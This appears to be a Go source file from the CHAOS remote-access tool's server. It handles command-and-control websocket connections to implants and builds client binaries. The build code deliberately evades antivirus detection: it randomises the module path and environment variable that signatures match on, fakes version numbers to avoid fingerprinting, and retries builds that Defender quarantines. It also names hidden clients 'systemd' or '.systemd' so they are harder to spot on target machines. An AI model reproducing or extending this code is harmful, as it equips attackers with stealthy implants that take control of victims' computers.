package client

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/image"
	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
	"github.com/tiagorlampert/CHAOS/internal/utils/random"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/internal/utils/validation"
	"github.com/tiagorlampert/CHAOS/presentation/http/request"
	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
	"github.com/tiagorlampert/CHAOS/services/auth"
	syscallCmd "github.com/tiagorlampert/CHAOS/services/client/syscall_cmd"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
)

const (
	clientBaseDir        = "client/"
	buildBaseDir         = "build/"
	configFileName       = "config.json"
	mainFileName         = "main.go"
	clientConfigFilepath = "app/utils/config.go"
	buildStr             = `go build -trimpath -buildvcs=false -ldflags="%s -s -w -buildid= -X 'main.Version=%s' -extldflags -static" -o ../../../temp/%s .`
	runtimeDirName       = `runtime`
	hiddenLinuxFilename  = "systemd"
	hiddenMacFilename    = ".systemd"
	buildAttempts        = 3
	// clientModulePath is rewritten to a random path for every build, because
	// antivirus family signatures match on it.
	clientModulePath = "github.com/tiagorlampert/CHAOS/client"
	// hiddenEnvVarName is the marker the detached child inherits. It is
	// rewritten as well so it does not show up in the process environment.
	hiddenEnvVarName = "CHAOS_RUN_HIDDEN"
)

type clientService struct {
	AppVersion    string
	Clients       map[string]*websocket.Conn
	Mu            *sync.Mutex
	Configuration *environment.Configuration
	Repository    authRepo.Repository
	AuthService   auth.Service
}

func NewClientService(
	appVersion string,
	configuration *environment.Configuration,
	repository authRepo.Repository,
	authService auth.Service,
) Service {
	return &clientService{
		AppVersion:    appVersion,
		Configuration: configuration,
		Clients:       make(map[string]*websocket.Conn, 0),
		Mu:            &sync.Mutex{},
		Repository:    repository,
		AuthService:   authService,
	}
}

func (c clientService) GetConnection(clientID string) (*websocket.Conn, bool) {
	c.Mu.Lock()
	conn, found := c.Clients[clientID]
	c.Mu.Unlock()
	return conn, found
}

func (c clientService) RemoveConnection(clientID string) error {
	c.Mu.Lock()
	delete(c.Clients, clientID)
	c.Mu.Unlock()
	return nil
}

func (c clientService) AddConnection(clientID string, connection *websocket.Conn) error {
	c.Mu.Lock()
	c.Clients[clientID] = connection
	c.Mu.Unlock()
	return nil
}

func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
	client, found := c.GetConnection(input.ClientID)
	if !found {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	command := &entities.Command{
		Command:   input.Command,
		Parameter: input.Parameter,
	}

	req, err := json.Marshal(command)
	if err != nil {
		return SendCommandOutput{}, err
	}

	err = client.WriteMessage(websocket.BinaryMessage, req)
	if err != nil {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	_, readMessage, err := client.ReadMessage()
	if err != nil {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	var response request.RespondCommandRequestBody
	if err := json.Unmarshal(readMessage, &response); err != nil {
		return SendCommandOutput{}, err
	}

	command.Response = response.Response
	command.HasError = response.HasError

	command, err = handleResponse(command)
	if err != nil {
		return SendCommandOutput{}, err
	}

	res := utils.ByteToString(command.Response)
	if command.HasError {
		return SendCommandOutput{}, fmt.Errorf(res)
	}
	if len(strings.TrimSpace(res)) == 0 {
		return SendCommandOutput{Response: internal.NoContent}, nil
	}
	return SendCommandOutput{Response: res}, nil
}

func handleResponse(payload *entities.Command) (*entities.Command, error) {
	const screenshotCmd = "screenshot"
	switch payload.Command {
	case screenshotCmd:
		filepath, err := image.WritePNG(payload.Response)
		if err != nil {
			return nil, err
		}
		payload.Response = utils.StringToByte(filepath)
		break
	default:
		return payload, nil
	}
	return payload, nil
}

func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
	if !validation.IsValidIPAddress(input.GetServerAddress()) &&
		!validation.IsValidURL(input.GetServerAddress()) &&
		!validation.IsValidHostname(input.GetServerAddress()) {
		return "", internal.ErrInvalidServerAddress
	}
	if !validation.IsValidPort(input.ServerPort) {
		return "", internal.ErrInvalidServerPort
	}

	goos, found := system.OSTargetGoOSMap[input.OSTarget]
	if !found {
		return "", internal.ErrInvalidOSTarget
	}

	goarch := input.GetOSArch()
	if !system.IsSupportedArch(input.OSTarget, goarch) {
		return "", internal.ErrInvalidOSArch
	}

	buildPath, err := c.PrepareBuildSession(input)
	if err != nil {
		return "", err
	}
	defer utils.RemoveDir(buildPath)

	buildPackage, err := maskRuntimeDirectory(buildPath, input.MaskName)
	if err != nil {
		return "", err
	}

	filename := buildFilename(input.OSTarget, input.GetFilename(), input.RunHidden)
	buildCmd := fmt.Sprintf(
		getEnvVarBuild(goos, goarch)+" "+buildStr,
		getBuildFlags(input.OSTarget, input.RunHidden, input.MaskName),
		buildVersion(c.AppVersion),
		filename,
	)

	outputPath := filepath.Join(internal.TempDirectory, filename)

	// Defender and other scanners may quarantine the linker output in the Go
	// build directory while it is being written, which fails the build. The
	// compile results are cached, so re-running the link is cheap.
	var outputErr []byte
	for attempt := 1; attempt <= buildAttempts; attempt++ {
		outputErr, err = runBuildCommand(buildCmd, buildPackage)
		if err == nil {
			if _, statErr := os.Stat(outputPath); statErr == nil {
				return filename, nil
			}
			err = fmt.Errorf("build output %q was not written", filename)
		}
	}
	return "", fmt.Errorf("%w:%s", err, outputErr)
}

func runBuildCommand(buildCmd, buildPackage string) ([]byte, error) {
	var cmd *exec.Cmd

	switch system.DetectOS() {
	case system.Windows:
		cmd = exec.Command("cmd")
		cmd.SysProcAttr = syscallCmd.GetCmdSyscall(buildCmd)
	default:
		cmd = exec.Command("sh", "-c", buildCmd)
	}

	cmd.Dir = buildPackage
	return cmd.CombinedOutput()
}

func (c clientService) BuildClientConfiguration(input BuildClientBinaryInput) (map[string]entities.ClientParam, error) {
	token, err := c.GenerateNewToken()
	if err != nil {
		return nil, err
	}

	const stringLength = 10
	const portKey = "port"
	const serverAddressKey = "server_address"
	const tokenKey = "token"

	configurationMap := make(map[string]entities.ClientParam)

	configurationMap[portKey] = entities.ClientParam{
		Key:   random.GenerateString(stringLength),
		Value: input.GetServerPort(),
	}
	configurationMap[serverAddressKey] = entities.ClientParam{
		Key:   random.GenerateString(stringLength),
		Value: input.GetServerAddress(),
	}
	configurationMap[tokenKey] = entities.ClientParam{
		Key:   random.GenerateString(stringLength),
		Value: token,
	}

	return configurationMap, err
}

func (c clientService) GenerateNewToken() (string, error) {
	config, err := c.AuthService.GetAuthConfig()
	if err != nil {
		return "", err
	}
	return jwt.NewToken(config.SecretKey, jwt.IdentityDefaultUser)
}

func (c clientService) WriteClientConfigurationFile(configuration map[string]entities.ClientParam, buildPath string, sessionFilename string) error {
	m := make(map[string]string)
	for _, config := range configuration {
		m[config.Key] = config.Value
	}

	configurationJson, err := json.Marshal(m)
	if err != nil {
		return err
	}

	encoded := utils.EncodeBase64(string(configurationJson))

	return utils.WriteFile(buildPath+sessionFilename, bytes.NewBufferString(encoded).Bytes())
}

func (c clientService) ReplaceClientConfigurationFile(configuration map[string]entities.ClientParam, buildPath string, sessionFilename string) error {
	filepath := buildPath + clientConfigFilepath
	f, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	content := string(f)
	for key, param := range configuration {
		oldParam := fmt.Sprintf(`"%s"`, key)
		newParam := fmt.Sprintf(`"%s"`, param.Key)
		content = strings.ReplaceAll(content, oldParam, newParam)
	}

	return utils.WriteFile(filepath, bytes.NewBufferString(content).Bytes())
}

func (c clientService) ReplaceMainConfigurationFile(buildPath string, sessionFilename string) error {
	filepath := buildPath + mainFileName
	f, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	content := strings.ReplaceAll(string(f), configFileName, sessionFilename)
	return utils.WriteFile(filepath, bytes.NewBufferString(content).Bytes())
}

func (c clientService) PrepareBuildSession(input BuildClientBinaryInput) (string, error) {
	sessionID := uuid.New().String()
	sessionFilename := fmt.Sprintf("%s", sessionID)
	buildPath := fmt.Sprint(buildBaseDir, sessionID, "/")

	err := utils.CopyDir(clientBaseDir, buildPath)
	if err != nil {
		return "", err
	}

	runtimeDir := buildPath + runtimeDirName + "/"
	err = utils.CopyDir(clientBaseDir, runtimeDir)
	if err != nil {
		return "", err
	}

	clientConfiguration, err := c.BuildClientConfiguration(input)
	if err != nil {
		return "", err
	}

	err = c.WriteClientConfigurationFile(clientConfiguration, runtimeDir, sessionFilename)
	if err != nil {
		return "", err
	}

	err = c.ReplaceClientConfigurationFile(clientConfiguration, runtimeDir, sessionFilename)
	if err != nil {
		return "", err
	}

	err = c.ReplaceMainConfigurationFile(runtimeDir, sessionFilename)
	if err != nil {
		return "", err
	}

	if err := anonymizeRuntimeDirectory(runtimeDir); err != nil {
		return "", err
	}

	return buildPath, nil
}

// maskRuntimeDirectory renames the copy compiled into the binary to an anonymous
// directory, so the build path cannot be read from the executable.
// It returns the directory the build must run in.
func maskRuntimeDirectory(buildPath string, maskName bool) (string, error) {
	runtimeDir := filepath.Join(buildPath, runtimeDirName)
	if !maskName {
		return runtimeDir, nil
	}

	if err := os.RemoveAll(filepath.Join(runtimeDir, ".git")); err != nil {
		return "", err
	}

	maskedDir := filepath.Join(buildPath, uuid.New().String())
	if err := os.Rename(runtimeDir, maskedDir); err != nil {
		return "", err
	}
	return maskedDir, nil
}

// anonymizeRuntimeDirectory swaps the well-known CHAOS identifiers in the client
// sources for random ones. Antivirus signatures for CHAOS match on the module
// path and the hidden-mode environment variable, so every build gets its own.
func anonymizeRuntimeDirectory(runtimeDir string) error {
	replacements := map[string]string{
		clientModulePath: randomModulePath(),
		hiddenEnvVarName: randomEnvVarName(),
	}

	return filepath.Walk(runtimeDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		if filepath.Ext(path) != ".go" && filepath.Base(path) != "go.mod" {
			return nil
		}

		content, err := os.ReadFile(path)
		if err != nil {
			return err
		}

		replaced := string(content)
		for oldValue, newValue := range replacements {
			replaced = strings.ReplaceAll(replaced, oldValue, newValue)
		}
		if replaced == string(content) {
			return nil
		}
		return utils.WriteFile(path, []byte(replaced))
	})
}

// randomModulePath returns a plausible module path that belongs to no real project.
func randomModulePath() string {
	return fmt.Sprintf("github.com/%s/%s", randomWord(5, 9), randomWord(5, 10))
}

func randomEnvVarName() string {
	return strings.ToUpper(randomWord(3, 5)) + "_" + strings.ToUpper(randomWord(6, 10))
}

func randomWord(minLength, maxLength int) string {
	const alphabet = "abcdefghijklmnopqrstuvwxyz"

	length := minLength + rand.Intn(maxLength-minLength+1)
	word := make([]byte, length)
	for i := range word {
		word[i] = alphabet[rand.Intn(len(alphabet))]
	}
	// Only letters are used, so the segments never start with a digit.
	return string(word)
}

// buildVersion hides that dev builds carry no version, which is unusual for a
// released application and another fingerprint.
func buildVersion(appVersion string) string {
	version := strings.TrimSpace(appVersion)
	if len(version) > 0 && version != "dev" {
		return version
	}
	return fmt.Sprintf("%d.%d.%d", 1+rand.Intn(5), rand.Intn(10), rand.Intn(10))
}

func getEnvVarBuild(goos, goarch string) string {
	if system.DetectOS() == system.Windows {
		return fmt.Sprintf("set CGO_ENABLED=0& set GOOS=%s& set GOARCH=%s&", goos, goarch)
	}
	return fmt.Sprintf("CGO_ENABLED=0 GOOS=%s GOARCH=%s", goos, goarch)
}

func getBuildFlags(osType system.OSType, runHidden, maskName bool) string {
	var flags []string
	if runHidden {
		switch osType {
		case system.Windows:
			flags = append(flags, "-H=windowsgui")
		case system.Linux, system.Darwin:
			flags = append(flags, "-X 'main.RunHidden=true'")
		}
	}
	if maskName && (osType == system.Linux || osType == system.Darwin) {
		flags = append(flags, "-X 'main.MaskName=true'")
	}
	return strings.Join(flags, " ")
}

func buildFilename(os system.OSType, filename string, runHidden bool) string {
	if len(strings.TrimSpace(filename)) <= 0 {
		filename = defaultBuildFilename(os, runHidden)
	}
	switch os {
	case system.Windows:
		return fmt.Sprint(filename, ".exe")
	default:
		return filename
	}
}

// defaultBuildFilename picks an inconspicuous name so hidden clients are
// harder to spot on the target machine.
func defaultBuildFilename(os system.OSType, runHidden bool) string {
	if runHidden {
		switch os {
		case system.Linux:
			return hiddenLinuxFilename
		case system.Darwin:
			return hiddenMacFilename
		}
	}
	return uuid.New().String()
}
